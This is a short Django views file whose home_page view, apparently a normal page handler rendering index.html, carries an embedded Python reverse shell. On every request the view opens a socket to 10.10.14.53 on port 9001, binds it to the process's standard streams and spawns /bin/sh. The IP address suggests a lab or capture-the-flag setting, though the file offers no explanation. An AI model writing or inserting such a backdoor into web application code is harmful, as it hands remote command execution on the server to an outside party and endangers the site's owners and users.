import socket,os,pty

from django.shortcuts import render
from django.views.generic import TemplateView

def home_page(request):
    template_name = "index.html"
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.53",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
    return render(request,template_name)
